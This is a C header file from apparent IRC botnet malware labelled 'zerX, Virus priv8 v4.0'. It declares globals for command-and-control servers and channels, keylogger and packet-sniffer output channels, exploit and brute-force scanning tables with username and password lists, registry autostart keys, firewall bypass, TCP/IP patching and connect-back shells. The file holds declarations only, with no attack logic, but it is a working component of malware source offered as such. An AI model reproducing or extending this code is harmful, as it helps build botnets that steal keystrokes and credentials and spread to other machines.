/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
// config extern globals for module use
extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern int port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern int port2;
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char szLocalPayloadFile[];
extern char modeonconn[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];
extern unsigned short bindport;
extern int connbackport;

extern int tftpport;
extern int httpport;
extern int rloginport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;

extern BOOL BypassFW;
extern BOOL PatchTCPIP;


extern char prefix;

extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;

// global threads
extern THREAD threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern ALIAS aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];
extern SCANALL scanall[];

// misc
extern DWORD started;

extern int transfers_tftp;
extern int transfers_ftp;
extern int connectback_shells;

#ifdef DEBUG_LOGGING
extern char logfile[];
#endif


// ftpd shit
#ifndef NO_FTPD
extern int ftpport;
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif

#ifndef NO_VNC 
extern char http[]; 
#endif
